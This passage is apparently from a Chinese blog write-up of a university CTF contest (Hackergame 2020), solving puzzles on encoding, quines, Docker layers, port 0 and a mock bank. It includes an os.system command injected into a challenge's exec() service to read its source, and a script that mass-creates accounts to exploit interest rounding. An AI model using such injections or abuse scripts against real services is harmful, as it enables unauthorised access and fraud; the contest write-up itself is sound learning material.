class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  